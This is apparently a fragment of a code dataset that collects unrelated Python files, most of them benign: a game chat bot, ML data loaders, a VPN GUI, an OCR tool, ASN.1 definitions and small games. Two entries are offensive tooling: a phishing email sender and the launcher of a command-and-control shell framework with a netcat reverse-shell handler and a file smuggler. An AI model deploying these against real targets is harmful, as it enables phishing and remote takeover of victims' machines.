kirim_pesan(random.choice(quotes))\r\n\r\ndef klik():\r\n    time.sleep(1)\r\n    pyautogui.click(40, pyautogui.size()[1] - 70)\r\n    pyautogui.click(230, pyautogui.size()[1] - 70)\r\n\r\ndef kirim_pesan(message):\r\n    pyautogui.typewrite('/')\r\n    pyautogui.press('backspace')\r\n    pyautogui.typewrite(message)\r\n    pyautogui.press('enter')\r\n    pyautogui.typewrite('/clearchat')\r\n    pyautogui.press('enter')\r\n\r\ndef read_usernames():\r\n    with open('name.txt', 'r') as file:\r\n        usernames = [line.strip() for line in file]\r\n    return usernames\r\n\r\ndef menu(username):\r\n    usernames = read_usernames()\r\n    current_time = time.localtime()\r\n    current_hour = str(current_time.tm_hour) \r\n    current_minute = str(current_time.tm_min)\r\n\r\n    def adminmenu():\r\n        kirim_pesan(\"> thr\")\r\n        kirim_pesan(\"> give\")\r\n        kirim_pesan('> nama_keren')\r\n        kirim_pesan('> skin_cl')\r\n        kirim_pesan(\"> day\")\r\n        kirim_pesan(\"> (pertambahan)\")\r\n        kirim_pesan(\"> quotes\")\r\n        kirim_pesan(\"> puja\")\r\n        kirim_pesan(\"> owner\")\r\n        kirim_pesan(\"> ai\")\r\n        kirim_pesan(\"> py!!\")\r\n        kirim_pesan(\"< hunt\")\r\n        kirim_pesan(\"< stats\")\r\n        kirim_pesan(\"< buy\")\r\n        kirim_pesan(\"< gacha\")\r\n\r\n    def menu():\r\n        pesan_salam = f\"Hai [{username}] Jam: {current_hour}:{current_minute}\"\r\n        kirim_pesan(pesan_salam)\r\n        kirim_pesan(\"Saya adalah Joseph\")\r\n        kirim_pesan(\"Mafia bot dari Party Keluarga Hamburg\")\r\n        time.sleep(4)\r\n        kirim_pesan(\"Menu yang tersedia :\")\r\n        time.sleep(2)\r\n        kirim_pesan(\"> thr \")\r\n        kirim_pesan(\"> give\")\r\n        kirim_pesan('> nama_keren')\r\n        kirim_pesan('> skin_cl')\r\n        kirim_pesan(\"> day\")\r\n        kirim_pesan(\"> (pertambahan)\")\r\n        kirim_pesan(\"> quotes\")\r\n        kirim_pesan(\"> puja\")\r\n        kirim_pesan(\"> own",
    "import torch\nimport torchvision.transforms as transforms\nfrom torch.utils.data import Dataset\nimport os\nfrom PIL import Image\n\ntransform = transforms.Compose([\n            transforms.Resize(400),\n            transforms.CenterCrop(400),    #\u663e\u5b58\u4e0d\u8db3\u5c31\u7f29\u5c0f\u56fe\u50cf\u5c3a\u5bf8\n            transforms.ToTensor()        #\u663e\u5b58\u4e0d\u8db3\u5c31\u7f29\u5c0f\u56fe\u50cf\u5c3a\u5bf8\n])\n\nclass PreprocessDataset(Dataset):\n    \"\"\"\u9884\u5904\u7406\u6570\u636e\u96c6\u7c7b\"\"\"\n\n    def __init__(self, HRPath, scale_factor):\n        \"\"\"\u521d\u59cb\u5316\u9884\u5904\u7406\u6570\u636e\u96c6\u7c7b\"\"\"\n        self.scale_factor = scale_factor\n        img_names = os.listdir(HRPath)\n        self.HR_imgs = [HRPath + \"/\" + img_name for img_name in img_names]\n\n    def __len__(self):\n        \"\"\"\u83b7\u53d6\u6570\u636e\u957f\u5ea6\"\"\"\n        return len(self.HR_imgs)\n\n    def __getitem__(self, index):\n        \"\"\"\u83b7\u53d6\u6570\u636e\"\"\"\n        HR_img = self.HR_imgs[index]\n\n        HR_img = Image.open(HR_img)\n\n        HR_img = transform(HR_img)\n        LR_img = torch.nn.MaxPool2d(self.scale_factor, stride=self.scale_factor)(HR_img)   #\u5c06\u9ad8\u5206\u8fa8\u7387\u4e0b\u91c7\u68374\u500d\uff0c\u5f62\u6210\u4f4e\u5206\u8fa8\u7387\n\n        return LR_img, HR_img     #\u8fd4\u56de\u4f4e\u548c\u9ad8\u5206\u8fa8\u7387\u56fe\u7247\n\n\nclass testPreprocessDataset(Dataset):\n    \"\"\"\u9884\u5904\u7406\u6570\u6d4b\u8bd5\u636e\u96c6\u7c7b\uff0c\u4e0d\u8fdb\u884cResize\u64cd\u4f5c\uff0c\u8fdb\u884c\u539f\u56fe\u7684\u6307\u6807\u9a8c\u8bc1\"\"\"\n\n    def __init__(self, HRPath, scale_factor):\n        \"\"\"\u521d\u59cb\u5316\u9884\u5904\u7406\u6570\u636e\u96c6\u7c7b\"\"\"\n        self.scale_factor = scale_factor\n        img_names = os.listdir(HRPath)\n        self.HR_imgs = [HRPath + \"/\" + img_name for img_name in img_names]\n\n    def __len__(self):\n        \"\"\"\u83b7\u53d6\u6570\u636e\u957f\u5ea6\"\"\"\n        return len(self.HR_imgs)\n\n    def __getitem__(self, index):\n        \"\"\"\u83b7\u53d6\u6570\u636e\"\"\"\n        HR_img = self.HR_imgs[index]\n\n        HR_img = Image.open(HR_img)\n\n        HR_img = transforms.ToTensor()(HR_img)\n        LR_img = torch.nn.MaxPool2d(self.scale_factor, stride=self.scale_factor)(HR_img)   #\u5c06\u9ad8\u5206\u8fa8\u7387\u4e0b\u91c7\u68374\u500d\uff0c\u5f62\u6210\u4f4e\u5206\u8fa8\u7387\n\n        return LR_img, HR_img     #\u8fd4\u56de\u4f4e\u548c\u9ad8\u5206\u8fa8\u7387\u56fe\u7247\n\n",
    "#Powered By feelded.t.me\r\n\r\nimport os\r\nimport sys\r\nimport re\r\nimport time\r\nimport json\r\nimport winreg\r\nimport atexit\r\nfrom PyQt5.QtCore import QThread, Qt\r\nfrom PyQt5.QtGui import QIcon, QPalette, QColor\r\nfrom PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QVBoxLayout, QCheckBox, QLineEdit, QListWidget, QListWidgetItem, QLabel, QSpinBox, QAbstractSpinBox, QGroupBox, QGridLayout, QVBoxLayout\r\n\r\n#System Configs\r\nclass Config(object):\r\n    VERSION_NUMBER = 'v1.0'\r\n    DRAFT = 'false'  # Lowercase [true, false]\r\n    PRE_RELEASE = 'false'  # Lowercase [true, false], !! Tag name must contain only pre released builds\r\n    OS = 'Windows-x64' # Idk whats yours !?\r\n    COPYRIGHT = 2024\r\n    CREDIT = 'feelded.t.me'\r\n\r\n#Get file path\r\ndef GetPath(pathex):\r\n    if hasattr(sys, '_MEIPASS'):\r\n        return str(os.path.join(sys._MEIPASS, pathex)).replace('\\\\', '/')\r\n    return str(os.path.join(os.path.abspath(\".\"), pathex)).replace('\\\\', '/')\r\n\r\n#Set Proxy\r\ndef SetProxy(proxy_host, proxy_port):\r\n    try:\r\n        internet_settings_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings', 0, winreg.KEY_WRITE)\r\n        winreg.SetValueEx(internet_settings_key, 'ProxyEnable', 0, winreg.REG_DWORD, 1)\r\n        winreg.SetValueEx(internet_settings_key, 'ProxyServer', 0, winreg.REG_SZ, f'socks={proxy_host}:{proxy_port}')\r\n        winreg.CloseKey(internet_settings_key)\r\n        print(\"SOCKS5 proxy set successfully.\")\r\n    except Exception as e:\r\n        print(f\"Error setting SOCKS5 proxy: {e}\")\r\n\r\n#Unset Proxy\r\ndef UnsetProxy():\r\n    try:\r\n        internet_settings_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings', 0, winreg.KEY_WRITE)\r\n        winreg.SetValueEx(internet_settings_key, 'ProxyEnable', 0, winreg.REG_DWORD, 0)\r\n        winreg.CloseKey(internet_settings_key)\r\n        print(\"SOCKS5 proxy unset successfully.\")\r\n    except Exception as e:\r\n        print(f\"Error unsetting SOCKS5 proxy: {e}\")\r\n\r\n\r\n#Shut the proxy on exit\r\ndef OnExit(): UnsetProxy(); os.system('taskkill /F /IM VoxCore.exe'); return print('Bye:)')\r\n\r\n\r\n#VPN CLASS\r\nclass VPNApp(QWidget):\r\n    def __init__(self):\r\n        super().__init__()\r\n        self.initUI()\r\n        atexit.register(OnExit)\r\n\r\n    def initUI(self):\r\n        print('VOX LOGS - FREEDOM')\r\n        self.setWindowTitle('Vox VPN')\r\n\r\n        layout = QVBoxLayout()\r\n\r\n        self.setFixedWidth(500)\r\n        self.setFixedHeight(400)\r\n\r\n        icon = QIcon(GetPath('media/vpn.png'))\r\n        self.setWindowIcon(icon)\r\n        \r\n        palette = self.palette()\r\n        palette.setColor(QPalette.Window, QColor(0, 0, 0))\r\n        self.setPalette(palette)\r\n\r\n        self.worker_thread = QThread()\r\n\r\n        self.connect_button = QPushButton('Connect', self)\r\n        self.connect_button.clicked.connect(self.connect_clicked)\r\n        self.connect_button.setStyleSheet(\"QPushButton:pressed {background-color: rgb(30, 30, 30);border: 2px solid white;}QPushButton {background-color: #111;border-radius: 8px;color: white;height: 30%;} QPushButton:disabled {color: #4caf50;background-color: rgb(30, 30, 30)}\")\r\n        layout.addWidget(self.connect_button)\r\n\r\n        self.disconnect_button = QPushButton('Disconnect', self)\r\n        self.disconnect_button.clicked.connect(self.disconnect_clicked)\r\n        self.disconnect_button.setStyleSheet(\"QPushButton:pressed {background-color: rgb(30, 30, 30);border: 2px solid white;}QPushButton {background-color: #111;border-radius: 8px;color: white;height: 30%;} QPushButton:disabled {color: #f44336;background-color: rgb(30, 30, 30)}\")\r\n        layout.addWidget(self.disconnect_button)\r\n\r\n        self.cfon_checkbox = QCheckBox('CFON Mode', self)\r\n        self.cfon_checkbox.setStyleSheet(\"QCheckBox {color: white;text-align: center;}QCheckBox::indicator {width: 20px;height: 20px;}QCheckBox::indicator:checked {image: url({CHECK});}QCheckBox::indicator:unchecked {image: url({REMOVE});}\".replace('{REMOVE}', GetPath('media/remove.png')).replace('{CHECK}', GetPath('media/check.png')))\r\n        self.cfon_checkbox.setChecked(True)\r\n        layout.addWidget(self.cfon_checkbox, alignment=Qt.AlignCenter)\r\n        self.cfon_checkbox.stateChanged.connect(self.cfon_state)\r\n\r\n        self.scan_checkbox = QCheckBox('SCAN Mode', self)\r\n        self.scan_checkbox.setStyleSheet(\"QCheckBox {color: white;text-align: center;}QCheckBox::indicator {width: 20px;height: 20px;}QCheckBox::indicator:checked {image: url({CHECK});}QCheckBox::indicator:unchecked {image: url({REMOVE});}\".replace('{REMOVE}', GetPath('media/remove.png')).replace('{CHECK}', GetPath('media/check.png')))\r\n        layout.addWidget(self.scan_checkbox, alignment=Qt.AlignCenter)\r\n\r\n        self.port_textbox = QSpinBox(self)\r\n        self.port_textbox.setAlignment(Qt.AlignCenter)\r\n        self.port_textbox.setButtonSymbols(QAbstractSpinBox.NoButtons) \r\n        self.port_textbox.setRange(1024, 65535)\r\n        self.port",
    "import smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\ndef send_phishing_email(sender_email, sender_password, recipient_email, subject, message):\n    try:\n        smtp_server = smtplib.SMTP('smtp.gmail.com', 587)\n        smtp_server.starttls()\n        smtp_server.login(sender_email, sender_password)\n\n        email_message = MIMEMultipart()\n        email_message['From'] = sender_email\n        email_message['To'] = recipient_email\n        email_message['Subject'] = subject\n        email_message.attach(MIMEText(message, 'plain'))\n\n        smtp_server.send_message(email_message)\n        print(\"Phishing email sent successfully\")\n    except Exception as e:\n        print(\"An error occurred:\", e)\n    finally:\n        smtp_server.quit()\n\nif __name__ == \"__main__\":\n    sender_email = input(\"Enter your email address: \")\n    sender_password = input(\"Enter your email password: \")\n    recipient_email = input(\"Enter recipient's email address: \")\n    subject = input(\"Enter email subject: \")\n    message = input(\"Enter email message: \")\n\n    send_phishing_email(sender_email, sender_password, recipient_email, subject, message)\n",
    "#\"E:/comtext/panorama360-master/images/View_from_Sky_Tower_Akl_small.jpg\"\r\n#\u8bfb\u53d6\"E:/comtext/panorama360-master/images/View_from_Sky_Tower_Akl_small.jpg\"\u7684\u56fe\u7247\u5e76\u8f6c\u6362\u6210\u7403\u5f62\u5168\u666f\u56fe\r\nimport cv2\r\nimport numpy as np\r\n\r\ndef cylindrical_to_spherical(x, y, width, height):\r\n \r\n    theta = (x / width) * 2 * np.pi\r\n    phi = (y / height) * np.pi - np.pi / 2\r\n    return theta, phi\r\n\r\ndef spherical_to_cartesian(theta, phi):\r\n    \r\n    x = np.cos(phi) * np.cos(theta)\r\n    y = np.cos(phi) * np.sin(theta)\r\n    z = np.sin(phi)\r\n    return x, y, z\r\n\r\ndef equirectangular_to_cartesian(x, y, width, height):\r\n   \r\n    theta = (x / width) * 2 * np.pi - np.pi\r\n    phi = (y / height) * np.pi - np.pi / 2\r\n    return spherical_to_cartesian(theta, phi)\r\n\r\ndef cartesian_to_equirectangular(x, y, z, width, height):\r\n    \r\n    theta = np.arctan2(y, x)\r\n    phi = np.arctan2(z, np.sqrt(x**2 + y**2))\r\n    x_eq = (theta + np.pi) / (2 * np.pi) * width\r\n    y_eq = (phi + np.pi / 2) / np.pi * height\r\n    return int(x_eq), int(y_eq)\r\n\r\ndef transform_to_panorama(cylindrical_img, output_width, output_height):\r\n    height, width = cylindrical_img.shape[:2]\r\n    panorama_img = np.zeros((output_height, output_width, 3), dtype=np.uint8)\r\n    \r\n    for y in range(output_height):\r\n        for x in range(output_width):\r\n            theta, phi = cylindrical_to_spherical(x, y, output_width, output_height)\r\n            x_cyl, y_cyl, z_cyl = spherical_to_cartesian(theta, phi)\r\n            x_eq, y_eq = cartesian_to_equirectangular(x_cyl, y_cyl, z_cyl, width, height)\r\n            if 0 <= x_eq < width and 0 <= y_eq < height:\r\n                panorama_img[y, x] = cylindrical_img[y_eq, x_eq]\r\n    \r\n    return panorama_img\r\n\r\n\r\ncylindrical_img = cv2.imread(\"test_target_photo1.jpg\")\r\n\r\n\r\noutput_width = 4096\r\noutput_height = 2048\r\n\r\n\r\npanorama_img = transform_to_panorama(cylindrical_img, output_width, output_height)\r\n\r\n\r\n\r\ncv2.imwrite(\"image.jpg\", panorama_img)\r\n\r\n\r\n\r\n",
    "from typing import Any, List, Union\nimport pandas as pd\nfrom datamaxi.api import API\nfrom datamaxi.lib.utils import check_required_parameter\nfrom datamaxi.lib.constants import BASE_URL\nfrom datamaxi.lib.utils import postprocess\n\n\nclass Naver(API):\n    \"\"\"Client to fetch Naver trend data from DataMaxi+ API.\"\"\"\n\n    def __init__(self, api_key=None, **kwargs: Any):\n        \"\"\"Initialize the object.\n\n        Args:\n            api_key (str): The DataMaxi+ API key\n            **kwargs: Keyword arguments used by `datamaxi.api.API`.\n        \"\"\"\n        if \"base_url\" not in kwargs:\n            kwargs[\"base_url\"] = BASE_URL\n            super().__init__(api_key, **kwargs)\n\n    def keywords(self) -> List[str]:\n        \"\"\"Get Naver trend supported keywords\n\n        `GET /v1/naver/keywords`\n\n        <https://docs.datamaxi.finance/naver/keywords>\n\n        Returns:\n            List of supported Naver trend keywords\n        \"\"\"\n        url_path = \"/v1/naver/keywords\"\n        return self.query(url_path)\n\n    @postprocess()\n    def trend(self, keyword: str, pandas: bool = True) -> Union[List, pd.DataFrame]:\n        \"\"\"Get Naver trend for given keyword\n\n        `GET /v1/naver/trend`\n\n        <https://docs.datamaxiplus.com/naver/trend>\n\n        Args:\n            keyword (str): keyword to search for\n            pandas (bool): Return data as pandas DataFrame\n\n        Returns:\n            Naver trend data\n        \"\"\"\n        check_required_parameter(keyword, \"keyword\")\n        params = {\"keyword\": keyword}\n        return self.query(\"/v1/naver/trend\", params)\n",
    "import fitz\nimport pytesseract\nfrom PIL import Image\nimport os\nimport io\nimport sys\n\nargs = sys.argv\n\ntextExtracted = ''\n\ndef extract_text_from_pdf(pdf_path):\n    text = \"\"\n    with fitz.open(pdf_path) as doc:\n        for page_num in range(len(doc)):\n            page = doc.load_page(page_num)\n            page_text = page.get_text().strip()\n            text += page_text + \"\\n\\n\"\n    return text\n\ndef extract_images_from_pdf(pdf_path, output_folder):\n    doc = fitz.open(pdf_path)\n    for page_number in range(len(doc)):\n        page = doc.load_page(page_number)\n        image_list = page.get_images(full=True)\n        for image_index, img in enumerate(image_list):\n            xref = img[0]\n            base_image = doc.extract_image(xref)\n            image_bytes = base_image[\"image\"]\n            image = Image.open(io.BytesIO(image_bytes))\n            image.save(f\"{output_folder}/page{page_number + 1}_image{image_index + 1}.png\")\n\ndef perform_ocr_on_images(image_folder):\n    text = ''\n    for filename in os.listdir(image_folder):\n        if filename.endswith(\".png\"):\n            image_path = os.path.join(image_folder, filename)\n            img = Image.open(image_path)\n            text += (pytesseract.image_to_string(img) + \"/n\")\n    return text\n\n# Usage\narguments = args[1:]\n\nif len(arguments) >= 1:\n    filename = arguments[0]\nelse:\n    filename = \"test.pdf\"\n\npdf_path = filename\nimage_folder = \"/images\"\noutput_folder = \"output\"\n\nextract_images_from_pdf(pdf_path, output_folder + image_folder)\n\ntextExtracted = extract_text_from_pdf(pdf_path)\n\ntextExtracted += perform_ocr_on_images(output_folder + image_folder)\n\nwith open(f\"{output_folder}/texts/extracted_text.txt\", \"w\") as txt_file:\n    txt_file.write(textExtracted)\n",
    "# This file is being contributed to pyasn1-modules software.\n#\n# Created by Russ Housley.\n# Modified by Russ Housley to add maps for use with opentypes.\n#\n# Copyright (c) 2019, Vigil Security, LLC\n# License: http://snmplabs.com/pyasn1/license.html\n#\n# Use of the Advanced Encryption Standard (AES) Encryption\n#   Algorithm in the Cryptographic Message Syntax (CMS)\n#\n# ASN.1 source from:\n# https://www.rfc-editor.org/rfc/rfc3565.txt\n\n\nfrom pyasn1.type import constraint\nfrom pyasn1.type import univ\n\nfrom pyasn1_modules import rfc5280\n\n\nclass AlgorithmIdentifier(rfc5280.AlgorithmIdentifier):\n    pass\n\n\nclass AES_IV(univ.OctetString):\n    pass\n\nAES_IV.subtypeSpec = constraint.ValueSizeConstraint(16, 16)\n\n\nid_aes128_CBC = univ.ObjectIdentifier('2.16.840.1.101.3.4.1.2')\n\nid_aes192_CBC = univ.ObjectIdentifier('2.16.840.1.101.3.4.1.22')\n\nid_aes256_CBC = univ.ObjectIdentifier('2.16.840.1.101.3.4.1.42')\n\n\nid_aes128_wrap = univ.ObjectIdentifier('2.16.840.1.101.3.4.1.5')\n\nid_aes192_wrap = univ.ObjectIdentifier('2.16.840.1.101.3.4.1.25')\n\nid_aes256_wrap = univ.ObjectIdentifier('2.16.840.1.101.3.4.1.45')\n\n\n# Update the Algorithm Identifier map\n\n_algorithmIdentifierMapUpdate = {\n    id_aes128_CBC: AES_IV(),\n    id_aes192_CBC: AES_IV(),\n    id_aes256_CBC: AES_IV(),\n    id_aes128_wrap: univ.Null(),\n    id_aes192_wrap: univ.Null(),\n    id_aes256_wrap: univ.Null(),\n}\n\nrfc5280.algorithmIdentifierMap.update(_algorithmIdentifierMapUpdate)\n",
    "import random\r\n\r\nprint(\"Welcome to the Guess the number!!!\")\r\nprint(\"------------------------------------\")\r\nname = input(\"Please Type Your Name: \")\r\nprint(\"------------------------------------\")\r\nprint(f\"Hello, {name}, Please Choose A Difficulty\")\r\nprint(\"------------------------------------\")\r\nprint(\"1 = Baby Mode\")\r\nprint(\"2 = Regular\")\r\nprint(\"3 = Hard\")\r\nprint(\"------------------------------------\")\r\n\r\nmode = int(input(f\"Please Enter Difficulty, {name}: \"))\r\n\r\nprint(\"------------------------------------\")\r\n\r\n##MODE SELECTION\r\n##Based on Mode selected gives desired difficultys like more lives and a smaller\r\nif mode == 1:\r\n    print(\"------------------------------------\")\r\n    print(\"You Have Chosen Baby Mode!!! \ud83d\udc76\ud83d\udc76\")\r\n    print(\"------------------------------------\")\r\n    a = random.randint(1, 10)\r\n    lives = 3\r\n    ##gives message to choose number once mode had been selected\r\nelif mode == 2:\r\n    print(\"------------------------------------\")\r\n    print(\"You Have Chosen Regular!!! \ud83d\ude0e\ud83d\ude0e \")\r\n    print(\"------------------------------------\")\r\n    a = random.randint(1, 50)\r\n    lives = 3\r\nelif mode == 3:\r\n    print(\"------------------------------------\")\r\n    print(\"You Have Chosen Hard Mode!!! \ud83d\udc79\ud83d\udc79\")\r\n    print(\"------------------------------------\")\r\n    a = random.randint(1, 100)\r\n    lives = 4\r\nelse:\r\n    print(\"------------------------------------\")\r\n    print(\"Somthing Went Wrong...\")\r\n    print(\"------------------------------------\")\r\n\r\nguess = int(input(\"Guess the Number: \"))\r\n\r\nwhile guess != a and lives != 0:\r\n    if guess > a:\r\n        print(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\")\r\n        print(\"You Have Guessed to High\")\r\n        print(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\")\r\n        guess = int(input(\"Guess the Number: \"))\r\n        print(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\")\r\n        lives = lives - 1\r\n        print(f\"{name}, has {lives} left...\")\r\n    elif guess < a:\r\n        print(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\")\r\n        print(\"You Have Guessed to Low\")\r\n        print(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\")\r\n        guess = int(input(\"Guess the Number: \"))\r\n        print(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\")\r\n        lives = lives - 1\r\n        print(f\"{name}, has {lives} lives left...\")\r\n\r\nif guess == a:\r\n    print(\"------------------------------------\")\r\n    print(\"You Guessed The Write Number You Won \ud83e\udd73\ud83c\udf8a\")\r\n    print(\"------------------------------------\")\r\n\r\nif lives == 0:\r\n    print(\"------------------------------------\")\r\n    print(\"YOU FAILED \ud83d\ude2d\ud83d\ude2d\")\r\n    print(\"------------------------------------\")\r\n    print(f\"The Answer is **{a}**\")\r\n    print(\"------------------------------------\")\r\n    print(f\"{name}, You Have {lives}\u2764\ufe0f Lives Left...\")\r\n    print(\"------------------------------------\")\r\n",
    "import threading\nimport time\nfrom src.core.server import app \nfrom src.core.server import start_server \nimport argparse\nimport threading\nimport time\nfrom rich.console import Console\nfrom rich import print\nimport colorama\n\n\ncolorama.init()\nparser = argparse.ArgumentParser(description=\"DrShell Command Line\")\nparser.add_argument(\"-p\", \"--port\", type=int, default=6501, help=\"Port for the Team Server\")\nparser.add_argument(\"-x\", \"--signal_port\", type=int, default=8080, help=\"Port for the signalShell Multi-Handler\")\nparser.add_argument(\"-n\", \"--netcat_port\", type=int, default=4443, help=\"Port for the Netcat TCP Multi-Handler\")\nparser.add_argument(\"-f\", \"--file_smuggler_port\", type=int, default=8888, help=\"Port for the HTTP File Smuggler\")\n\nargs = parser.parse_args()\n\nconsole =  Console()\n\n\n\n\ndef main():\n    \n    # \u062a\u0639\u0631\u064a\u0641 \u0627\u0644\u0646\u0635 \u0645\u0639 \u0627\u0644\u0631\u0648\u0627\u0628\u0637 \u0648\u0627\u0644\u062a\u062f\u0631\u062c \u0627\u0644\u0644\u0648\u0646\u064a\n    console.print(\"\"\"\n    ________            _________      .__  .__   \n    \\______ \\_______   /   _____/ ____ |  | |  |  \n    |    |  \\_  __ \\  \\_____  \\_/ __ \\|  | |  |  \n    |    `   \\  | \\/  /        \\  ___/|  |_|  |__\n    /_______  /__|    /_______  /\\___  >____/____/\n            \\/                \\/     \\/   \n                                                \n            \n                    By [link=https://github.com/DrDataYE]@DrDataYE[/link]\n                    \n    \\[[bold green]Info[/bold green]] Follow on [link=https://x.com/DrDataYE]Twitter[/link], [link=https://github.com/DrDataYE]GitHub[/link], [link=https://t.me/DrDataYE]Telegram[/link], [link=https://youtube.com/DrDataYE]Youtube[/link]\n    \\[[bold green]Info[/bold green]] Thank you!              \n    \"\"\") \n    threading.Thread(target=start_server, args=(\"0.0.0.0\", args.port, \"Team Server\")).start()\n    threading.Thread(target=start_server, args=(\"0.0.0.0\", args.signal_port, \"signalShell Multi-Handler\")).start()\n    threading.Thread(target=start_server, args=(\"0.0.0.0\", args.netcat_port, \"Netcat TCP Multi-Handler\")).start()\n    threading.Thread(target=start_server, args=(\"0.0.0.0\", args.file_smuggler_port, \"HTTP File Smuggler\")).start()\n    time.sleep(1)\n    console.print(\"\\nWelcome to DrShell. Type help or ? to list commands.\\n\",style=\"bold\")\n\n    while True:\n            try:\n                app.cmdloop()\n            except KeyboardInterrupt:\n                print(\"Use 'exit -y' to leave\")\n                \n",
    "from player import Player\nfrom event import *\nfrom action import Action\n\nclass ActionStrategy:\n    def execute(self, player : Player, event : Event, amount : int):\n        return False, 'function not implemented'\n\nclass BuyStrategy(ActionStrategy):\n    def execute(self, player : Player, event : Event, amount : int):\n        if amount <= 0: \n                return False, '\u041e\u0448\u0438\u0431\u043a\u0430! \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0434\u043b\u044f \u043f\u0440\u043e\u0434\u0430\u0436\u0438 \u0434\u043e\u043b\u0436\u043d\u043e \u0431\u044b\u0442\u044c \u0431\u043e\u043b\u044c\u0448\u0435 0'\n        if isinstance(event, StockEvent):\n            if player.balance >= event.price * amount:\n                player.balance -= event.price * amount\n                event_index = next((index for index, player_stock in enumerate(player.stocks) if player_stock.name == event.name), None)\n                if event_index is not None:\n                    player.stocks[event_index].quantity += amount\n                else:\n                    player.stocks.append(StockEvent(event.name, '', event.price, amount))\n                return True, f'\u0412\u044b \u043a\u0443\u043f\u0438\u043b\u0438 {event.name} \u0432 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u0435 {amount} \u043f\u043e \u0446\u0435\u043d\u0435 {event.price} \u043d\u0430 \u0441\u0443\u043c\u043c\u0443 {event.price*amount}'\n            else:\n                return False, f'\u0412\u0430\u043c \u043d\u0435 \u0445\u0432\u0430\u0442\u0430\u0435\u0442 {event.price * amount - player.balance} \u0434\u043b\u044f \u043f\u043e\u043a\u0443\u043f\u043a\u0438 {amount}x {event.name} \u043f\u043e {event.price}, \u0437\u0430 {event.price * amount}'\n        elif isinstance(event, PropertyEvent):\n            return False, 'buy Property function not implemented'\n        elif isinstance(event, ExpenseEvent):\n            return False, '\u0412\u044b \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u043f\u043e\u043a\u0443\u043f\u043a\u0443 \u0434\u043b\u044f \u044d\u0442\u043e\u0433\u043e \u0441\u043e\u0431\u044b\u0442\u0438\u044f'\n        else:\n            return False, 'function not implemented'\n        \nclass SellStrategy(ActionStrategy):\n    def execute(self, player : Player, event : Event, amount : int):\n        if amount <= 0: \n                return False, '\u041e\u0448\u0438\u0431\u043a\u0430! \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0434\u043b\u044f \u043f\u0440\u043e\u0434\u0430\u0436\u0438 \u0434\u043e\u043b\u0436\u043d\u043e \u0431\u044b\u0442\u044c \u0431\u043e\u043b\u044c\u0448\u0435 0'\n        if isinstance(event, StockEvent):\n            event_index = next((index for index, player_stock in enumerate(player.stocks) if player_stock.name == event.name), None)\n            if event_index is not None:\n                player_stock = player.stocks[event_index]\n                if player_stock.quantity < amount:\n                    return False, f'\u0412\u044b \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u043f\u0440\u043e\u0434\u0430\u0442\u044c {event.name} \u0432 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u0435 {amount}, \u0443 \u0432\u0430\u0441 \u0435\u0441\u0442\u044c \u0442\u043e\u043b\u044c\u043a\u043e {player_stock.quantity}'\n                player_stock.quantity -= amount\n                player.balance += event.price * amount\n                if player_stock.quantity <= 0:\n                    del player.stocks[event_index]\n                return True, f'\u0412\u044b \u043f\u0440\u043e\u0434\u0430\u043b\u0438 {event.name} \u0432 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u0435 {amount} \u043f\u043e \u0446\u0435\u043d\u0435 {event.price} \u043d\u0430 \u0441\u0443\u043c\u043c\u0443 {event.price*amount}'\n            else:\n                return False, f'\u0423 \u0432\u0430\u0441 \u043d\u0435\u0442 {event.name}'\n        elif isinstance(event, PropertyEvent):\n            return False, 'sell Property function not implemented'\n        elif isinstance(event, ExpenseEvent):\n            return False, '\u0412\u044b \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u043f\u0440\u043e\u0434\u0430\u0436\u0443 \u0434\u043b\u044f \u044d\u0442\u043e\u0433\u043e \u0441\u043e\u0431\u044b\u0442\u0438\u044f'\n        else:\n            return False, 'function not implemented'\n    \nclass CheckStrategy(ActionStrategy):\n    def execute(self, player : Player, event : Event, amount : int):\n        if isinstance(event, StockEvent):\n            return True, '\u0412\u044b \u043f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u043b\u0438 \u044d\u0442\u043e \u0441\u043e\u0431\u044b\u0442\u0438\u0435'\n        elif isinstance(event, PropertyEvent):\n            return True, '\u0412\u044b \u043f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u043b\u0438 \u044d\u0442\u043e \u0441\u043e\u0431\u044b\u0442\u0438\u0435'\n        elif isinstance(event, ExpenseEvent):\n            if player.balance >= event.cost:\n                player.balance -= event.cost\n                return True, f'\u0412\u044b \u043f\u043e\u0442\u0440\u0430\u0442\u0438\u043b\u0438 {event.cost} \u043d\u0430 {event.name}'\n            else:\n                return False, f'\u0412\u0430\u043c \u043d\u0435 \u0445\u0432\u0430\u0442\u0430\u0435\u0442 {event.cost - player.balance} \u0434\u043b\u044f \u043f\u043e\u043a\u0443\u043f\u043a\u0438 {event.name} \u0437\u0430 {event.cost}'\n        else:\n            return True, 'function not implemented'\n        \n# \u0424\u0430\u0431\u0440\u0438\u043a\u0430 \u0441\u0442\u0440\u0430\u0442\u0435\u0433\u0438\u0439\nclass StrategyFactory:\n    @staticmethod\n    def get_strategy(action_type : Action):\n        if action_type == Action.BUY:\n            return BuyStrategy()\n        elif action_type == Action.SELL:\n            return SellStrategy()\n        elif action_type == Action.CHECK:\n            return 